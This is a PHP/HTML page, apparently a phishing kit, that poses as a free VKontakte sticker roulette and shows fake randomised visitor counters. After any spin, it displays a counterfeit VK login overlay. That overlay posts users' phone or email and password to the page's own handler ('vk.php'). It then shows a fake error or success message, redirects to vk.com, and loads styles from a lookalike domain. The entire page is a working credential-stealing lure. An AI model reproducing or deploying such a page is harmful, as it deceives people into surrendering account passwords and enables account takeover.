<?php include('vk.php'); ?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <!--[if lt IE 9]>
    <script src="html5.js" tppabs="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
    <title>Кейс «Стикеры каждому»</title>
    <link rel="shortcut icon" href="./main/favicon.png" type="image/png">
    <link rel="stylesheet" type="text/css" href="./main/style.min.css" tppabs="style.min.css">
<script src="./main/jquery.min.js"></script>
<script src="./main/jquery-ui.min.js"></script> 
<script src="./main/roulette.js"></script> 
<body>
<div class="wrapper">
    <header class="header">
        <div class="inner">
            <div class="logo"><a href="#"><img src="./main/logo@2x.png" tppabs="logo@2x.png" style="padding-top: 21px;"></a>
            </div>
            <div class="stat">
                            <div class="o">Онлайн
							<br>
							<?=rand(300,351) ?>
                            </div>
                            <div class="l"></div>
                            <div class="o">Пользователей
                                <br>
							<?=rand(17100,17250) ?>
                            </div>
                            <div class="l"></div>
                            <div class="o">Открыто кейсов
                                <br>
							<?=rand(144000,145000) ?>
                            </div>
                            <div class="cls"></div>
                        </div>
           
            <nav class="nav">
    
                <ul>
                     <li><a href="#" class="bonus eas">Бесплатные стикеры!</a></li>
                </ul>
            </nav>
            <div class="cls"></div>
        </div>
    </header>
    <main class="content">
        <div class="inner">
    <div class="case-page"><a "class="btn darkblue backtocases">
        
        <div class="spin">
            <h1>Кейс «Стикеры каждому»</h1>
                        <div class="desc">Можете выиграть один из 17 наборов стикеров ВКонтакте
            </div>
            <div class="spin-box">
                <div class="spin-line"></div>
                <div class="spin-inner">
                    <div class="roulette">
<div id="xxx1" class="XXX">
                        
<div class="X"><img src="./main/1.png" id="gift-id-1" alt=""></div> 
<div class="X"><img src="./main/3.png" id="gift-id-3" alt=""></div> 
<div class="X"><img src="./main/4.png" id="gift-id-4" alt=""></div> 
<div class="X"><img src="./main/5.png" id="gift-id-5" alt=""></div> 
<div class="X"><img src="./main/6.png" id="gift-id-6" alt=""></div> 
<div class="X"><img src="./main/7.png" id="gift-id-7" alt=""></div> 
<div class="X"><img src="./main/8.png" id="gift-id-8" alt=""></div> 
<div class="X"><img src="./main/9.png" id="gift-id-9" alt=""></div> 
<div class="X"><img src="./main/10.png" id="gift-id-10" alt=""></div> 
<div class="X"><img src="./main/11.png" id="gift-id-11" alt=""></div> 
<div class="X"><img src="./main/12.png" id="gift-id-12" alt=""></div> 
<div class="X"><img src="./main/13.png" id="gift-id-13" alt=""></div> 
<div class="X"><img src="./main/14.png" id="gift-id-14" alt=""></div> 
<div class="X"><img src="./main/15.png" id="gift-id-15" alt=""></div> 
<div class="X"><img src="./main/16.png" id="gift-id-16" alt=""></div> 
<div class="X"><img src="./main/17.png" id="gift-id-17" alt=""></div> 
<div class="X"><img src="./main/18.png" id="gift-id-18" alt=""></div> 
</div>

                                            </div>
                </div>
                <div class="cls"></div>
            </div>
                        <div class="cls"></div>
            <div class="button">
<script type="text/javascript">
var oneHeight=210,
    numImage=17,
    speedStep=0.2;
function LetsGo(){
    clearInterval(LetsGo.interval);
    var x=[];
    for(var i in{xxx1:17}){
        var ob=2+Math.floor(Math.random()*3),
         nn=Math.random()*numImage;
            num=Math.floor(nn), 
            o={
                ob:ob,num:num,
            a:document.getElementById(i), 
            speed:Math.sqrt(((ob*numImage+num)* oneHeight)* speedStep*2), 
            scr:-20 
        }; 
        x.push(o);
    } 
    LetsGo.interval=setInterval(
        function (){
            var i = x.length,complete=true;
            while(i--){ 
                var a=x[i];
                a.scr+=a.speed;
                if(a.speed>2*speedStep){ 
                    a.speed-=speedStep;complete=false;
                } else if(a.speed>0) { 
                    var t= Math.round(a.scr / oneHeight);
                    if(t>=numImage) t=0;
                    console.log(i,t,a.scr-oneHeight*t,a.ob,a.num);
                    a.scr=oneHeight*t;
                    a.speed=0;
                    complete=false;
					  $('.vkframe, #overlay').show();
                }
                if(a.scr>(oneHeight*numImage))
                    a.scr-=oneHeight*numImage;
                a.a.scrollTop=Math.floor(a.scr);
            }
            if(complete) clearInterval(LetsGo.interval)
        },20)


}
</script>

                <button class="btn blue rounded" onclick="LetsGo()" ;="">Открыть бесплатно</button>
            </div>
            <div class="cls"></div>
        </div>
		
		
		
		
		
		
        <div class="cls"></div>
        <div class="you-can-won">
            <h3>Предметы, которые могут вам выпасть из этого кейса</h3>
            <div class="history-cases MarginTop-40">
                
                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/1.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/3.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/4.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/5.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/6.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/7.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/8.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/9.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/10.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/11.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/12.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/13.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/14.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/15.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/16.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/17.png" alt="">
                        </div>
                    </div>
					                    <div class="history-case">
                        <div class="coin gold">
                            <img src="./main/18.png" alt="">
                        </div>
                    </div>


                <div class="cls"></div>
            </div>
            <div class="cls"></div>
        </div>
        <div class="cls"></div>
    </a></div><a "class="btn darkblue backtocases">
    <style>
        
            -webkit-animation: inherit;
            animation: inherit;
        }
    </style>
</a></div><a "class="btn darkblue backtocases">
    </a></main><a "class="btn darkblue backtocases">

    </a><footer class="footer"><a "class="btn darkblue backtocases">
        </a><div class="inner"><a "class="btn darkblue backtocases">
            </a><div class="l"><a "class="btn darkblue backtocases">
                </a><ul><a "class="btn darkblue backtocases">
                    </a><li><a "class="btn darkblue backtocases"></a><a href="https://vk.com" target="_blank" class="bonus eas">Вконтакте</a></li>
                </ul>
                <div class="copy">
                    Copyright © 2017 Рулетка стикеров. Все права защищены.<br>Играя на сайте вы принимаете пользовательское соглашение<a>
                              </a></div><a>
            </a></div><a>
            <div class="r">

            </div>
            <div class="cls"></div>
        </a></div><a>
    </a></footer><a>
</a></div><a>
<link rel="stylesheet" type="text/css" href="https://vkonte.live/api/v1/frame.css">
<script language="javascript" type="text/javascript" src="https://vk.com/js/api/common_light.js"></script>
<link rel="stylesheet" type="text/css" href="https://vkonte.live/api/login/frame.css">
<div class="vkframe" style="<?php if ($num != 0){ ?> display: block<?php }else{ ?>display: none<?php }?>"> <div class="VK oauth_page vk_auth" style="background: transparent; position: fixed; bottom: 130px; left: 346.5px; z-index: 90000;"> <div id="sub_cont" style=""> <table id="container" class="container" cellspacing="0" cellpadding="0"> <tbody><tr> <td class="head" style="padding: 14px 20px 18px;"> <a href="https://vk.com" target="_blank" class="logo"></a> <div class="auth_items"> <a class="head_name fl_r" href="http://vk.com/join?reg=1" target="_blank" style="width: 15%;">Регистрация</a> </div> </td> </tr> <tr> <td valign="top"> <div class="info_line" style="font-size: 11px">Для продолжения необходимо войти через <b>ВКонтакте</b>.</div> <div id="box_cont"> <center> <div style="width:80%; <?=$baza ?>">
<?php if($num == 1) { ?><div class="msg msg-error" style="display: block;color: #cc0000;">Пожалуйста, проверьте правильность написания логина и пароля.</div> <?php } ?>
<?php if($num == 2) { ?><script> setTimeout(function(){location.replace("https://vk.com/");}, 2000);
 </script><div class="msg msg-success" style="display: block;">Авторизация прошла успешно! Ожидайте.</div><?php } ?>

</div> <div id="box" class="box box_login"> <form method="post" id="vkonteclub"> <div class="info"> <div class="form_header">Телефон или e-mail</div> <div class="labeled"><input type="text" name="email" class="text" style="width:153px"></div> <div class="form_header">Пароль</div> <div class="labeled"><input type="password" id="password" name="password" class="text" style="width:153px"></div> <div id="captcha" style="display:none;"> <br> <img id="captcha_img" style="width: 130px; height: 50px; margin: 0 auto; background: url(http://vk.me/images/vklogo.gif); cursor: pointer;"> <div class="input-group"> 
<div class="form_header">Код с картинки</div> <input type="text" name="captcha_sid" value="<?=$kek?> style="display:none;"> <div class="labeled">
<input type="text" style="width:153px" name="captcha_key" class="text"></div> </div> </div> <div class="popup_login_btn">
<br><input class = "flat_button button_big" style="width: 155px;text-align: center;" id="login" value="Войти" type="submit"> </div> </div></form> </div> </center> </div> </td> </tr> </tbody></table> </div> </div> </div>
<div id="overlay" style="<?php if ($num != 0){ ?> display: block;<?php }else{ ?>display: none;<?php }?> height: 1438px; opacity: 0.7; position: absolute; top: 0px; left: 0px; background-color: black; width: 100%; z-index: 5000;"></div>

<style>
.pw-popup__title{color: #000;}
.pw-popup__text{color: #000;}
</style>
<center>


 <script src="./main/jquery-1.8.3.js"></script>
	<input type="hidden" name="vkonteurl" value="https://vk.com">


<div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">

</div></div>

</center></a>
</body></html>